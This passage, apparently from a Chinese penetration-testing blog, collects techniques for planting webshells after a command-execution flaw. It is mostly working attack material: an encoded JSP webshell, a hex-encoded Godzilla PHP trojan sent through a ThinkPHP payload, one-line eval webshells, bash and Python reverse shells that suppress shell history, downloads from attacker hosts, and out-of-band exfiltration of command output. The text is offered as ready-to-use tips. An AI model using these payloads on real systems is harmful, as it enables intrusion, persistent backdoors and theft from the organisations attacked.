iLyIpKyJpbWFnZXMvIik7fX1jYXRjaChFeGNlcHRpb24gZSl7c2IuYXBwZW5kKCJFUlJPUiIrIjovLyAiK2UudG9TdHJpbmcoKSk7fXNiLmFwcGVuZCgifCIrIjwtIik7b3V0LnByaW50KHNiLnRvU3RyaW5nKCkpOyU+ &gt;&gt;D:\\OA\\apache-tomcat-7.0.91\\webapps\\ROOT\\shell.txt&amp;&amp;echo -----END CERTIFICATE----- &gt;&gt;D:\\OA\\apache-tomcat-7.0.91\\webapps\\ROOT\\shell.txt</span><br></pre></td></tr></table></figure>
+<ol>
+<li>使用 certutil 解码</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -decode D:\\OA\\apache-tomcat-7.0.91\\webapps\\ROOT\\shell.txt D:\\OA\\apache-tomcat-7.0.91\\webapps\\ROOT\\shell.jsp</span><br></pre></td></tr></table></figure>
+<h3 id="场景三"><a href="#场景三" class="headerlink" title="场景三"></a>场景三</h3><p>是否有回显：否<br>是否通外网：是</p>
+<p>解决思路：<br>方法一：远程下载并执行（参考场景一方法二）</p>
+<p>方法二：OOB</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for /f %i in (&apos;whoami&apos;) do certutil -urlcache -split -f http://x.x.x.x/%i  #执行whoami命令并将结果发送至DNSLog</span><br><span class="line">for /r c:\ %i in (checkCode.js*) do certutil -urlcache -split -f http://x.x.x.x/%i  #寻找Web应用路径并将结果发送至DNSLog</span><br></pre></td></tr></table></figure>
+<h3 id="场景四"><a href="#场景四" class="headerlink" title="场景四"></a>场景四</h3><p>是否有回显：否<br>是否通外网：否</p>
+<p>解决思路：直接盲打</p>
+<ol>
+<li>直接盲打，定位 Web 路径并写入结果文件</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /r C:\ %i in (test.css*) do whoami &gt; %i/../test.txt</span><br></pre></td></tr></table></figure>
+<p>或者</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd /c &quot;for /f %i in (&apos;dir /s /b d:a.php&apos;) do (echo %i&gt; %i.path.txt)&amp;(ipconfig &gt; %i.ipconfig.txt)&quot;</span><br></pre></td></tr></table></figure>
+<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="场景一-1"><a href="#场景一-1" class="headerlink" title="场景一"></a>场景一</h3><p>是否有回显：是<br>是否通外网：是</p>
+<p>解决思路：最简单的场景，方法很多<br>方法一：确认 Web 应用物理路径，然后写入 webshell</p>
+<ol>
+<li>执行 pwd、ls 等命令确认一下 Web 路径在哪里</li>
+<li>写入 webshell</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo webshell的base64编码内容 |base64 -d &gt; Web应用目录/test.jsp  #echo命令直接写入webshell</span><br></pre></td></tr></table></figure>
+<p>Weblogic的情况</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type d -name bea_wls_internal|while read f;do find $f -type d -name war;done|while read ff;do echo $ff &gt;$ff/sectest.txt;done</span><br></pre></td></tr></table></figure>
+<p>方法二：反弹 shell, 方法很多, 不一一列出<br>a)bash</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br><span class="line">或者</span><br><span class="line">exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done</span><br></pre></td></tr></table></figure>
+<p>b)python<br>1.wget 或 curl 下载 python 反弹脚本，然后执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O /tmp/test.py http://x.x.x.x/test.py</span><br></pre></td></tr></table></figure>
+<p>2.python 反弹脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">import sys,os,socket,pty</span><br><span class="line">shell = &quot;/bin/sh&quot;</span><br><span class="line">def usage(name):</span><br><span class="line">    print &apos;python reverse connector&apos;</span><br><span class="line">    print &apos;usage: %s &lt;ip_addr&gt; &lt;port&gt;&apos; % name</span><br><span class="line"> </span><br><span class="line">def main():</span><br><span class="line">    if len(sys.argv) !=3:</span><br><span class="line">        usage(sys.argv[0])</span><br><span class="line">        sys.exit()</span><br><span class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    try:</span><br><span class="line">        s.connect((sys.argv[1],int(sys.argv[2])))</span><br><span class="line">        print &apos;connect ok&apos;</span><br><span class="line">    except:</span><br><span class="line">        print &apos;connect faild&apos;</span><br><span class="line">        sys.exit()</span><br><span class="line">    os.dup2(s.fileno(),0)</span><br><span class="line">    os.dup2(s.fileno(),1)</span><br><span class="line">    os.dup2(s.fileno(),2)</span><br><span class="line">    global shell</span><br><span class="line">    os.unsetenv(&quot;HISTFILE&quot;)</span><br><span class="line">    os.unsetenv(&quot;HISTFILESIZE&quot;)</span><br><span class="line">    os.unsetenv(&quot;HISTSIZE&quot;)</span><br><span class="line">    os.unsetenv(&quot;HISTORY&quot;)</span><br><span class="line">    os.unsetenv(&quot;HISTSAVE&quot;)</span><br><span class="line">    os.unsetenv(&quot;HISTZONE&quot;)</span><br><span class="line">    os.unsetenv(&quot;HISTLOG&quot;)</span><br><span class="line">    os.unsetenv(&quot;HISTCMD&quot;)</span><br><span class="line">    os.putenv(&quot;HISTFILE&quot;,&apos;/dev/null&apos;)</span><br><span class="line">    os.putenv(&quot;HISTSIZE&quot;,&apos;0&apos;)</span><br><span class="line">    os.putenv(&quot;HISTFILESIZE&quot;,&apos;0&apos;)</span><br><span class="line">    pty.spawn(shell)</span><br><span class="line">    s.close()</span><br><span class="line"> </span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<h3 id="场景二-1"><a href="#场景二-1" class="headerlink" title="场景二"></a>场景二</h3><p>是否有回显：是<br>是否通外网：否</p>
+<p>解决思路：针对这种场景，解决方法就比较灵活了。因为不通外网，所以主思路还是想办法写入 webshell。参考场景一方法一。</p>
+<h3 id="场景三-1"><a href="#场景三-1" class="headerlink" title="场景三"></a>场景三</h3><p>是否有回显：否<br>是否通外网：是</p>
+<p>解决思路：<br>方法一：直接反弹 shell, 参考场景一方法二</p>
+<p>方法二：OOB</p>
+<ol>
+<li>定位 Web 应用目录</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://x.x.x.x/`pwd|base64`  #大致确认一下当前目录，再通过ls、cd等命令获取Web应用目录，并发送结果至DNSLog</span><br></pre></td></tr></table></figure>
+<ol>
+<li>写入 webshell</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo webshell的base64编码内容 |base64 -d &gt; Web应用目录/test.jsp  #echo命令直接写入webshell</span><br></pre></td></tr></table></figure>
+<h3 id="场景四-1"><a href="#场景四-1" class="headerlink" title="场景四"></a>场景四</h3><p>是否有回显：否<br>是否通外网：否</p>
+<p>解决思路：最艰难的情况，直接盲打</p>
+<ol>
+<li>直接盲打，定位 Web 路径并写入结果文件</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /|grep check.js|while read f;do sh -c &quot;whoami&quot; &gt;$(dirname $f)/test.txt;done</span><br></pre></td></tr></table></figure>
+<h3 id="Certutil编码上传Webshell"><a href="#Certutil编码上传Webshell" class="headerlink" title="Certutil编码上传Webshell"></a>Certutil编码上传Webshell</h3><p>将“哥斯拉”的PHP木马在进行一次HEX或多次编码，然后将编码后的内容用set命令写入，最后再用certutil命令的decodehex参数将其解码并写入到shell.php文件即可。</p>
+<p>写入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;filter=system&amp;a=cmd.exe /c set /p=&quot;3C3F7068700A2020202073657373696F6E5F737461727428293B0A20202020407365745F74696D655F6C696D69742830293B0A09406572726F725F7265706F7274696E672830293B0A2020202066756E6374696F6E20452824442C244B297B0A2020202020202020666F722824693D303B24693C7374726C656E282444293B24692B2B29207B0A20202020202020202020202024445B24695D203D2024445B24695D5E244B5B24692B312631355D3B0A20202020202020207D0A202020202020202072657475726E2024443B0A202020207D0A2020202066756E6374696F6E2051282444297B0A202020202020202072657475726E206261736536345F656E636F6465282444293B0A202020207D0A2020202066756E6374696F6E204F282444297B0A202020202020202072657475726E206261736536345F6465636F6465282444293B0A202020207D0A2020202024503D2770617373273B0A2020202024563D277061796C6F6164273B0A2020202024543D2733633665306238613963313532323461273B0A2020202069662028697373657428245F504F53545B24505D29297B0A202020202020202024463D4F2845284F28245F504F53545B24505D292C245429293B0A202020202020202069662028697373657428245F53455353494F4E5B24565D29297B0A202020202020202020202020244C3D245F53455353494F4E5B24565D3B0A20202020202020202020202024413D6578706C6F646528277C272C244C293B0A202020202020202020202020636C61737320437B7075626C69632066756E6374696F6E206E766F6B6528247029207B6576616C2824702E2222293B7D7D0A20202020202020202020202024523D6E6577204328293B0A09090924522D3E6E766F6B652824415B305D293B0A2020202020202020202020206563686F20737562737472286D64352824502E2454292C302C3136293B0A2020202020202020202020206563686F20512845284072756E282446292C245429293B0A2020202020202020202020206563686F20737562737472286D64352824502E2454292C3136293B0A20202020202020207D656C73657B0A202020202020202020202020245F53455353494F4E5B24565D3D24463B0A20202020202020207D0A202020207D&quot; &gt; E:\phpstudys\PHPTutorial\WWW\bm\public\static\hex.txt</span><br></pre></td></tr></table></figure>
+<p>还原</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;filter=system&amp;a=cmd.exe /c certutil -decodehex E:\phpstudys\PHPTutorial\WWW\bm\public\static\hex.txt E:\phpstudys\PHPTutorial\WWW\bm\public\static\shell.php</span><br></pre></td></tr></table></figure>
+<h1 id="Tips-2"><a href="#Tips-2" class="headerlink" title="Tips-2"></a>Tips-2</h1><p>平常渗透过程中，我们可能利用远程命令执行漏洞反弹了一个shell回来，但是为了方便操作我们可能需要写一个webshell到目标服务器，但是如何才能在一个系统里边快速的定位到网站的绝对路径呢，如何才能在标准化系统中通过一条命令快速实现这一点呢？我不知道小伙伴们通常用什么样的方法，这里给大家介绍几种方法。</p>
+<p>方法一 ：打开web查看源码，复制一个特征字符串，然后替换进下面命令的htmlString搜索之。</p>
+<p>Win ：findstr /s/i/n /d:E:\code\xampp\htdocs\ /c:”htmlString” <em>.</em><br>Linux：find / -name “.” | xargs grep”htmlString”<br>方法二 ：对于linux系统，我们也可以尝试通过history命令去查找，同样的也可以去看.bash_history</p>
+<p>history | grep -E ‘cd|vi|ed|nano|et|mkdir|rm|find|ls|mv’ |grep -v grep | grep -E ‘www|html|nginx|apache|php|lighttp|web’ -i</p>
+<p>方法三 ：windows系统中也可以使用dir去匹配一个特征文件名</p>
+<p>dir /s/a-d/b E:\code\xampp\htdocs*重复度较低的文件名（支持通配符）</p>
+<h1 id="Tips-3"><a href="#Tips-3" class="headerlink" title="Tips-3"></a>Tips-3</h1><p><a href="https://xz.aliyun.com/t/2741" target="_blank" rel="noopener">https://xz.aliyun.com/t/2741</a></p>
+<h1 id="Tips-4"><a href="#Tips-4" class="headerlink" title="Tips-4"></a>Tips-4</h1><p>转载来自<a href="https://www.yuque.com/pmiaowu/gbq3vb/zfr90i" target="_blank" rel="noopener">https://www.yuque.com/pmiaowu/gbq3vb/zfr90i</a></p>
+<h2 id="linux查找某个文件并写入个新文件"><a href="#linux查找某个文件并写入个新文件" class="headerlink" title="linux查找某个文件并写入个新文件"></a>linux查找某个文件并写入个新文件</h2><p>0x01 前言<br>在实战中我们可能挖到了一个命令执行但是因为找不到目录而无法写shell。</p>
+<p>那么这种情况本篇文章就可以派上用场了 : )</p>
+<p>作用：查找系统的某个文件并在那个文件的同级目录下写入我们的新文件</p>
+<p>注意：在linux上能否成功写入要看当时执行的用户是否有权限写入</p>
+<p>0x02 命令<br>[查找的文件] 例如：1.jpg<br>[写入的内容] 例如：111<br>[写入的文件名字] 例如：111.txt</p>
+<p>命令:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name [查找的文件]|while read file;do sh -c &quot;echo &apos;[写入的内容]&apos;&quot;&gt;$(dirname $file)/[写入的文件名字];done</span><br></pre></td></tr></table></figure>
+<p>命令实例化：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name 1.jpg|while read file;do sh -c &quot;echo &apos;111&apos;&quot;&gt;$(dirname $file)/111.txt;done</span><br></pre></td></tr></table></figure>
+<p>0x03 例子</p>
+<p>场景:</p>
+<p>现在我们有一个命令执行漏洞，但是找不到站点的目录无法写shell，于是就想批量查找某个文件并在这个文件下写入我们自己的文件</p>
+<p>查看站点发现了一张图片 <a href="http://127.0.0.1/upload/2020/11/11/1.jpg" target="_blank" rel="noopener">http://127.0.0.1/upload/2020/11/11/1.jpg</a></p>
+<p>但是无法得知路径，这种情况下就可以使用下面的命令批量查找写入了</p>
+<p>0x03.1 例子一 - 普通写入</p>
+<p>查找linux上所有叫 1.jpg 的文件<br>并且在同级目录写入一个文件 111.txt<br>文件内容为 111</p>
+<p>命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name 1.jpg|while read file;do sh -c &quot;echo &apos;111&apos;&quot;&gt;$(dirname $file)/111.txt;done</span><br></pre></td></tr></table></figure>
+<p>执行完毕以后，linux上所有叫 1.jpg 的文件同级目录就都会写入一个 111.txt 文件了</p>
+<p>接着我们访问 <a href="http://127.0.0.1/upload/2020/11/11/111.txt" target="_blank" rel="noopener">http://127.0.0.1/upload/2020/11/11/111.txt</a></p>
+<p>就可以看到站点写入了一个 111.txt 文件</p>
+<p>内容为: 111</p>
+<p>0x03.2 例子二 - base64写shell<br>查找linux上所有叫 1.jpg 的文件<br>并且在同级目录写入一个文件 1.php<br>文件内容为<br>PD9waHAgZXZhbCgkX1JFUVVFU1RbMV0pOyA/Pgo= 解码等于<br>[查找的文件] 例如：1.jpg<br>[base64编码的内容] 没啥好说的，把想写的内容base64编码然后给这个参数即可<br>[写入的文件名字] 例如：1.php</p>
+<p>命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name [查找的文件]|while read file;do sh -c &quot;echo [base64编码的内容] | base64 -d&quot;&gt;$(dirname $file)/[写入的文件名字];done</span><br></pre></td></tr></table></figure>
+<p>命令实例化：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name 1.jpg|while read file;do sh -c &quot;echo PD9waHAgZXZhbCgkX1JFUVVFU1RbMV0pOyA/Pgo= | base64 -d&quot;&gt;$(dirname $file)/1.php;done</span><br></pre></td></tr></table></figure>
+<p>执行完毕以后，linux上所有叫 1.jpg 的文件同级目录就都会写入一个 1.php 文件了</p>
+<p>接着我们访问 <a href="http://127.0.0.1/upload/2020/11/11/1.php" target="_blank" rel="noopener">http://127.0.0.1/upload/2020/11/11/1.php</a></p>
+<p>就可以看到站点写入了一个 1.php 文件</p>
+<p>内容为:</p>
+<h1 id="linux下base64编码写shell"><a href="#linux下base64编码写shell" class="headerlink" title="linux下base64编码写shell"></a>linux下base64编码写shell</h1><p>0x01 例子</p>
+<p>0x1.1 例子一</p>
+<p>需求写入 到 1.php 文件中<br>前置条件-内容编码<br>命令：echo ‘’ | base64</p>
+<p>返回：PD9waHAgZXZhbCgkX1JFUVVFU1RbMV0pOyA/Pgo=<br>写shell：<br>把base64编码的内容,解密写入一个到1.php里面</p>
+<p>命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo PD9waHAgZXZhbCgkX1JFUVVFU1RbMV0pOyA/Pgo= | base64 -d &gt; 1.php</span><br></pre></td></tr></table></figure>
+<p>执行完毕以后会出现一个文件：1.php<br>内容是：</p>
+<h1 id="linux下base64命令加解密"><a href="#linux下base64命令加解密" class="headerlink" title="linux下base64命令加解密"></a>linux下base64命令加解密</h1><p>0x01 前言<br>linux下使用base64命令加解密字符串的方法</p>
+<p>0x02 加密</p>
+<p>0x02.1 普通加密</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">命令：echo &apos;要编码的内容&apos; | base64</span><br><span class="line">命令实例化：echo &apos;1234&apos; | base64</span><br><span class="line"> </span><br><span class="line">返回: MTIzNAo=</span><br></pre></td></tr></table></figure>
+<p>0x02.2 读取某个文件内容加密</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">命令：base64 [要编码的文件名字]</span><br><span class="line">例子：</span><br><span class="line">现在有个文件 1.txt</span><br><span class="line">内容是：1234</span><br><span class="line">现在要把它编码输出</span><br><span class="line"> </span><br><span class="line">命令实例：base64 ./1.txt</span><br><span class="line"> </span><br><span class="line">返回: MTIzNA==</span><br></pre></td></tr></table></figure>
+<p>0x03 解密</p>
+<p>0x03.1 普通解密</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">命令: echo [要解码的内容] | base64 -d</span><br><span class="line">命令实例化: echo MTIzNA== | base64 -d</span><br><span class="line"> </span><br><span class="line">返回: 1234</span><br></pre></td></tr></table></figure>
+<p>0x03.2 读取某个文件内容解密</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">命令：base64 -d [要解密的文件名字]</span><br><span class="line">例子：</span><br><span class="line">现在有个文件 2.txt</span><br><span class="line">内容是：MTIzNA==</span><br><span class="line">现在要把它解码输出</span><br><span class="line"> </span><br><span class="line">命令实例：base64 -d ./2.txt</span><br><span class="line"> </span><br><span class="line">返回: 1234</span><br></pre></td></tr></table></figure>
+<h1 id="windows-查找某个文件并写入个新文件"><a href="#windows-查找某个文件并写入个新文件" class="headerlink" title="windows 查找某个文件并写入个新文件"></a>windows 查找某个文件并写入个新文件</h1><p>0x01 前言<br>在实战中我们可能挖到了一个命令执行但是因为找不到目录而无法写shell。</p>
+<p>那么这种情况本篇文章就可以派上用场了 : )</p>
+<p>作用：查找系统的某个文件并在那个文件的同级目录下写入我们的新文件</p>
+<p>0x02 命令<br>[规定查找的盘符] 例如: c盘, d盘, e盘, f盘<br>[查找的文件] 例如：index.php<br>[写入的内容] 例如：<br>[写入的文件名字] 例如：hm.php</p>
+<p>命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /f %i in (&apos;dir /s /b [规定查找的盘符]:\[查找的文件]&apos;) do (echo &quot;[写入的内容]&quot; &gt; %i\..\[写入的文件名字])</span><br></pre></td></tr></table></figure>
+<p>命令实例化：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /f %i in (&apos;dir /s /b c:\index.php&apos;) do (echo &quot;&lt;?php eval($_REQUEST[1]); ?&gt;&quot; &gt; %i\..\hm.php)</span><br></pre></td></tr></table></figure>
+<p>0x03 例子<br>场景：</p>
+<p>现在我们有一个命令执行漏洞，但是找不到站点的目录无法写shell，于是就想批量查找某个文件并在这个文件下写入我们自己的文件</p>
+<p>查看站点发现了一张图片 <a href="http://127.0.0.1/upload/2020/11/11/1.jpg" target="_blank" rel="noopener">http://127.0.0.1/upload/2020/11/11/1.jpg</a></p>
+<p>但是无法得知路径，这种情况下就可以使用下面的命令批量查找写入了</p>
+<p>0x03.1 例子一 - 普通写入<br>查找c盘下面所有叫 1.jpg 的文件<br>并且在同级目录写入一个文件 test.txt<br>文件内容为 123</p>
+<p>命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /f %i in (&apos;dir /s /b c:\1.jpg&apos;) do (echo &quot;123&quot; &gt; %i\..\test.txt)</span><br></pre></td></tr></table></figure>
+<p>执行完毕以后，c盘所有叫 1.jpg 的文件同级目录就都会写入一个 test.txt 文件了</p>
+<p>接着我们访问 <a href="http://127.0.0.1/upload/2020/11/11/test.txt" target="_blank" rel="noopener">http://127.0.0.1/upload/2020/11/11/test.txt</a></p>
+<p>就可以看到站点写入了一个 test.txt 文件</p>
+<p>内容为: 123</p>
+<p>0x03.2 例子二 - base64写shell<br>查找c盘上所有叫 1.jpg 的文件<br>并且在同级目录写入一个文件 1.php<br>文件内容为<br>PD9waHAgZXZhbCgkX1JFUVVFU1RbMV0pOyA/Pgo= 解码等于</p>
+<h1 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h1><h1 id="先查找c盘上所有叫-1-jpg-的文件，然后把base64编码内容写入到-base64-hm-test-txt-文件里面"><a href="#先查找c盘上所有叫-1-jpg-的文件，然后把base64编码内容写入到-base64-hm-test-txt-文件里面" class="headerlink" title="先查找c盘上所有叫 1.jpg 的文件，然后把base64编码内容写入到 base64-hm-test.txt 文件里面"></a>先查找c盘上所有叫 1.jpg 的文件，然后把base64编码内容写入到 base64-hm-test.txt 文件里面</h1><p>[规定查找的盘符] 例如: c盘, d盘, e盘, f盘<br>[查找的文件] 例如：1.jpg<br>[base64编码的内容] 没啥好说的，把想写的内容base64编码然后给这个参数即可<br>[写入的文件名字] 例如：1.php</p>
+<p>命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /f %i in (&apos;dir /s /b [规定查找的盘符]:\[查找的文件]&apos;) do (echo [base64编码的内容] &gt; %i\..\[写入的文件名字])</span><br></pre></td></tr></table></figure>
+<p>实例执行命令-写base64文件到规定的路径下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /f %i in (&apos;dir /s /b c:\1.jpg&apos;) do (echo PD9waHAgZXZhbCgkX1JFUVVFU1RbMV0pOyA/Pgo= &gt; %i\..\base64-hm-test.txt)</span><br></pre></td></tr></table></figure>
+<h1 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h1><h1 id="在找到第一步写入的文件，进行base64解码以后进行二次写马"><a href="#在找到第一步写入的文件，进行base64解码以后进行二次写马" class="headerlink" title="在找到第一步写入的文件，进行base64解码以后进行二次写马"></a>在找到第一步写入的文件，进行base64解码以后进行二次写马</h1><p>[规定查找的盘符] 例如: c盘, d盘, e盘, f盘<br>[查找的文件] 例如：base64-hm-test.txt<br>[要解码的文件名字] 例如：base64-hm-test.txt<br>[写入的文件名字] 例如：1.php</p>
+<p>命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /f %i in (&apos;dir /s /b [规定查找的盘符]:\[查找的文件]&apos;) do (certutil.exe -decode %i\..\[要解码的文件名字] %i\..\[写入的文件名字])</span><br></pre></td></tr></table></figure>
+<p>实例执行命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /f %i in (&apos;dir /s /b c:\base64-hm-test.txt&apos;) do (certutil.exe -decode %i\..\base64-hm-test.txt %i\..\1.php)</span><br></pre></td></tr></table></figure>
+<p>完毕</p>
+<p>执行完毕以后，c盘所有叫 1.jpg 的文件同级目录就都会写入一个 1.php 文件了</p>
+<p>接着我们访问 <a href="http://127.0.0.1/upload/2020/11/11/1.php" target="_blank" rel="noopener">http://127.0.0.1/upload/2020/11/11/1.php</a></p>
+<p>就可以看到站点写入了一个 1.php 文件</p>
+<p>内容为:</p>
+<h1 id="windows-base64编码写shell"><a href="#windows-base64编码写shell" class="headerlink" title="windows base64编码写shell"></a>windows base64编码写shell</h1><p>0x01 例子<br>0x1.1 例子一<br>需求写入 到 1.php 文件中<br>前置条件-内容编码<br>本机执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -f -encode data.txt base64-data.txt</span><br></pre></td></tr></table></figure>
+<p>返回：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN CERTIFICATE-----</span><br><span class="line">PD9waHAgZXZhbCgkX1JFUVVFU1RbMV0pOyA/Pg==</span><br><span class="line">-----END CERTIFICATE-----</span><br></pre></td></tr></table></figure>
+<p>写shell：</p>
+<p>受害者机器上执行命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo PD9waHAgZXZhbCgkX1JFUVVFU1RbMV0pOyA/Pg== &gt; ./base64-data-1.txt</span><br></pre></td></tr></table></figure>
+<p>接着执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -f -decode ./base64-data-1.txt ./1.php</span><br></pre></td></tr></table></figure>
+<p>执行完毕以后会出现一个文件：1.php<br>内容是：</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#引言"><span class="toc-number">1.</span> <span class="toc-text">引言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#寻找web路径"><span class="toc-number">2.</span> <span class="toc-text">寻找web路径</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-文件查找法"><span class="toc-number">2.1.</span> <span class="toc-text">1.文件查找法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-源码查找法"><span class="toc-number">2.2.</span> <span class="toc-text">2.源码查找法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-带外查找"><span class="toc-number">2.3.</span> <span class="toc-text">3.带外查找</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#执行系统命令写shell"><span class="toc-number">3.</span> <span class="toc-text">执行系统命令写shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-直接写入法"><span class="toc-number">3.1.</span> <span class="toc-text">1.直接写入法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-转换法"><span class="toc-number">3.2.</span> <span class="toc-text">2.转换法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-二次法"><span class="toc-number">3.3.</span> <span class="toc-text">3.二次法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-远程下载法"><span class="toc-number">3.4.</span> <span class="toc-text">4.远程下载法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#遇到那种工具类，打的shiro或者weblogic或者strust2的，是windows的，可以用powershell写："><span class="toc-number">3.5.</span> <span class="toc-text">遇到那种工具类，打的shiro或者weblogic或者strust2的，是windows的，可以用powershell写：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows"><span class="toc-number">4.</span> <span class="toc-text">Windows</span></a><ol 